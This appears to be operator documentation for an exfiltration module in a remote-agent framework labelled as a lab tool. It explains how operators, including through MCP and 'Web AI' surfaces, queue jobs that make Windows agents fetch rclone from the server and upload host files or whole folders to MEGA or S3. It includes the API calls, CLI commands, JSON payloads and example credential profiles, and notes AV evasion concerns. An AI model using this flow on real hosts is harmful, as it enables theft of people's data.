# rclone exfil

See the [documentation wiki](README.md) and [architecture overview](architecture.md)
for deployment boundaries. This page covers rclone configuration and operator
flows.

Operators queue exfil of a **remote file or folder on the agent** to cloud storage (MEGA, S3, …). Go agents can use the isolated `rclone-exfil` plugin child; PowerShell agents and explicit binary mode use the existing rclone executable path. The active operator workspace owns registered profiles and sends only the selected job payload through the central broker.

## Execution modes

The REST, CLI, MCP, and Web AI surfaces accept `mode`:

- `auto` (default): use the isolated plugin child for a Windows amd64 Go agent when a matching plugin DLL is available; otherwise use the binary path.
- `plugin`: require the isolated plugin child. The request fails if the agent does not advertise Go PE plugin support or the server has no `rclone-exfil*.dll` artifact.
- `binary`: force the existing rclone executable path.

The workspace owns the plugin artifact and publishes a session-owner-scoped
delivery copy to central. The binary fallback remains supported for PowerShell
agents and compatibility testing.

Every successful queue response includes both `mode` (the requested mode)
and `execution_mode` (the resolved method, `plugin` or `binary`). The server
also records the resolved method in the session operator event. The CLI prints
it, and the WebUI shows it under the queued exfil command.

## Configuration ownership

Rclone profiles belong to the workspace's registered asset store at
`<deployment-root>/workspaces/<id>/assets/rclone/`. Upload `profiles.json`
through the workspace WebUI or use the explicit offline import in the
[deployment guide](deployment.md#rclone-profiles-registration-is-required).
A loose file copied into that directory is ignored until registered; inventory
enablement still applies. There is no legacy/environment/example fallback.
Default profile selection and transfer limits belong in that workspace's
`settings.json` as `RMM_RCLONE_DEFAULT_PROFILE` and `RMM_RCLONE_MAX_BYTES`.
Malformed enabled files and duplicate names return an explicit load error and
prevent job construction. Registration, missing profiles, and permission errors
must be fixed on the workspace rather than by copying secrets to central.

The workspace service reads the profile, default destination folder, and size
limit locally. It builds the selected plugin or binary payload and sends that
payload to the central broker for the agent transport. The central server does
not load the workspace profile file or persist the profile credentials. The
central server still needs the `rclone-exfil.dll` plugin artifact for Go plugin
jobs. Binary fallback additionally requires the Windows `rclone.exe` bootstrap
artifact on the central server because the agent downloads it from the beacon
endpoint.

## Flow

1. Operator queues via REST, CLI, MCP, or web UI (`exfil`).
2. Server enqueues `__EXFIL__` with JSON: local path, profile name, destination, and `RCLONE_CONFIG_*` env vars.
3. Agent downloads `rclone.exe` from the server once (beacon auth) into `%LOCALAPPDATA%\RMM\rclone.exe` if missing.
4. Agent runs **`rclone copyto`** (single file) or **`rclone copy`** (directory tree) and optional `rclone link` for MEGA files.
5. Agent POSTs `cloud_upload` result; transcript shows `remote_path → link` or destination path.

### Files vs folders

The agent detects the path type on the host:

| Local path on agent | rclone command | Default cloud dest (no `dest`) |
|---------------------|----------------|--------------------------------|
| File | `copyto` | `{profile.folder}/{basename}` |
| Directory | `copy` (recursive) | `{profile.folder}/{folder-basename}` |

Use the same operator commands for both — `exfil C:\Users\x\Documents\project mega-lab` uploads the whole tree.

`remote_path` is resolved on the agent host, not on the RMM server. For a
Windows amd64 Go agent, use a Windows path such as
`C:\Users\<user>\Desktop`; a controller-side macOS path like
`/Users/<user>/Desktop` will fail unless that exact path exists on the agent.

- **`RMM_RCLONE_MAX_BYTES`** applies to the **total** size (file length or sum of all files in the folder).
- MEGA **`link`** is generated for single-file exfil only (not folders).
- Optional **`dest`** overrides the remote path prefix (e.g. `"dest": "archives/project-backup"`).

During upload the agent also POSTs **`exfil_progress`** updates (bytes, percent, speed, ETA) roughly every 5s or 1% change. The web UI shows a live progress bar; progress events are **WebSocket-only** (not stored in session history).

Traffic exits the **agent network**, not the RMM server.

## Server setup

### 1. rclone binary

Place Windows **amd64** `rclone.exe` in the central code's `tools/rclone/`
directory, or save `RMM_RCLONE_BIN` in `central/settings.json`. A saved relative
path is resolved against `central/` by the wrapper. This is a binary bootstrap
artifact, not a profile credential source.

Agents fetch: `GET /tools/rclone.exe?id=<session_id>` (beacon token required).

### 2. Remote profiles

The workspace reads registered, enabled assets only. Copying a JSON file into
`assets/rclone/` does not register it. Upload through Config, install through
the asset API/CLI, or use the offline wrapper import described in the
[deployment guide](deployment.md#rclone-profiles-registration-is-required).
`rmm_rclone.validate_profiles` validates a named collection or a single-profile
asset before use. Invalid names/backend types and duplicate names across enabled
assets block job construction with a content-free configuration error.

Define named profiles as JSON:

| Workspace configuration | Purpose |
| --- | --- |
| Registered `assets/rclone/*.json` | Named profile definitions; upload/import required |
| `RMM_RCLONE_DEFAULT_PROFILE` in workspace settings | Default when the caller omits a profile |
| `RMM_RCLONE_MAX_BYTES` in workspace settings | Transfer cap; default 100 MiB, `0` means unlimited |

Example file (`tools/rclone/profiles.example.json`):

```json
{
  "mega-lab": {
    "type": "mega",
    "user": "lab@example.com",
    "pass": "secret",
    "folder": "RMM",
    "description": "Lab MEGA account"
  },
  "s3-lab": {
    "type": "s3",
    "provider": "AWS",
    "access_key_id": "AKIA...",
    "secret_access_key": "...",
    "region": "us-east-1",
    "folder": "rmm-uploads"
  }
}
```

Copy credentials into your lab config; do not commit real secrets.

For MEGA (and other remotes using `pass`), put the **plain** password in JSON. Both the PowerShell and Go agents run `rclone obscure` before upload. If you pre-obscured with `rclone obscure`, set `"pass_obscured": true` on that profile.

**Large files:** the default cap is 100 MiB. Set a suitable
`RMM_RCLONE_MAX_BYTES` in the owner's workspace settings (`0` means unlimited),
then restart that component through the deployment wrapper. Avoid a competing
central setting or shell variable; see [configuration ownership](service-settings.md).

Then queue exfil again (new jobs pick up the updated limit). Check your cloud backend quota (MEGA free tier may block very large uploads).

### Troubleshooting failed exfil

| Symptom | Likely cause |
|---------|----------------|
| `exceeds exfil limit` | Default **100 MB** cap — set `RMM_RCLONE_MAX_BYTES=0` in the workspace settings file |
| `rclone copyto failed (exit ?)` with stats JSON only | rclone exited before transfer; read the **error** line in the message (agent now parses JSON log `level=error`) |
| `0 B / 0 B` in log tail | Often auth/config or remote path — verify MEGA credentials in profiles and folder name |
| Large ISO (~6 GB+) | Raise the workspace size cap **and** confirm cloud storage quota (MEGA free accounts may reject multi-GB files) |

The web UI **Exfil** hint shows the current per-file cap from `GET /api/v1/rclone/config` (`max_bytes`).

Upload profiles through the workspace Config assets panel or the explicit
[offline import](deployment.md#rclone-profiles-registration-is-required), then
start with the deployment wrapper. Exporting legacy profile variables or copying
an unregistered file does not configure the live workspace loader.

Point the WebUI and CLI at that workspace service. Direct central requests to
`/api/v1/rclone/config` do not return workspace profiles; central Web AI uses
the authenticated owner relay for this operation.

Check status:

```bash
rmm_cli.py rclone-config
# or
curl -s -H "Authorization: Bearer $RMM_WORKSPACE_LOCAL_TOKEN" http://127.0.0.1:8787/api/v1/rclone/config
```

## Operator API

```http
POST /api/v1/sessions/{id}/exfil
Authorization: Bearer <RMM_API_TOKEN>
Content-Type: application/json

{"remote_path": "C:\\Users\\x\\doc.pdf", "profile": "mega-lab", "dest": "optional/path/file.pdf"}
```

Folder example:

```json
{"remote_path": "C:\\Users\\x\\project", "profile": "mega-lab"}
```

Uploads the directory recursively to `{profile.folder}/project/` on the remote.

```http
GET /api/v1/rclone/config
```

## CLI and MCP

- `rmm_cli.py exfil <remote_path> [--profile NAME] [--dest PATH]`
- `rmm_cli.py rclone-config [--json]`
- MCP: `queue_exfil` (`mode`: `auto`, `plugin`, or `binary`), `get_rclone_config`
- Web UI: profile dropdown populated from the active deployment's
  `GET /rclone/config` (type + folder label)

## Result event

`type`: `cloud_upload`

```json
{
  "remote_path": "C:\\Users\\x\\doc.pdf",
  "profile": "mega-lab",
  "backend": "mega",
  "dest": "RMM/doc.pdf",
  "success": true,
  "link": "https://mega.nz/#!…",
  "size": 12345,
  "path_kind": "file",
  "error": null
}
```

`path_kind` is `file` or `dir` (agent-side).

### Progress (live only)

While `rclone copy` / `rclone copyto` runs, the agent POSTs `type=exfil_progress`:

```http
POST /result?id=<session>&type=exfil_progress
```

```json
{
  "remote_path": "C:\\Users\\x\\doc.pdf",
  "profile": "mega-lab",
  "bytes": 104857600,
  "total_bytes": 6666666666,
  "percent": 1.6,
  "speed_bps": 12500000,
  "eta_seconds": 520
}
```

The server broadcasts these on the operator WebSocket (`exfil_progress` events). The web UI renders a **progress bar** (same component as agent downloads) under the queued exfil command. Progress is **not** appended to `events.jsonl` (avoids transcript spam on multi-GB uploads).

When rclone JSON stats omit `totalBytes`, the agent falls back to the source file or folder total size from the exfil job so progress updates are not skipped.

## Security (lab)

- Credentials travel in the beacon command queue (HTTPS); they are not stored in `client_rmm.ps1`.
- rclone env vars are cleared after each job on the agent.
- Use dedicated lab cloud accounts with limited quota.
- rclone is a known living-off-the-land binary; expect AV interest outside lab VMs.

## Related code

| File | Role |
|------|------|
| `rmm_rclone.py` | Profiles, env builder, and workspace/server exfil payloads |
| `server_rmm.py` | `queue_agent_exfil`, `queue_workspace_exfil`, `/tools/rclone.exe`, `cloud_upload` handler |
| `client_rmm.ps1` | Bootstrap, `Invoke-RmmRcloneExfil` |
| `tools/rclone/` | Binary + example profiles |

## Module reference (`rmm_rclone.py`)

| Symbol | Role |
|--------|------|
| `load_profiles()` | Read profiles from env/file |
| `get_profile(name)` | Resolve named profile |
| `profile_to_rclone_env(profile)` | Build `RCLONE_CONFIG_RMM_*` dict |
| `profile_to_plugin_settings(profile)` | Build plugin backend settings with rclone option names |
| `get_rclone_default_profile()` | Read the active default profile name |
| `build_plugin_exfil_job(...)` | Build an in-process Go plugin job from a local profile |
| `build_exfil_payload(...)` | Build the legacy binary payload from a local profile |
| `build_exfil_command(...)` | Full `__EXFIL__` command string |
| `build_exfil_command_from_payload(...)` | Serialize a workspace-built binary payload |
| `rclone_public_config()` | Operator-safe status dict |
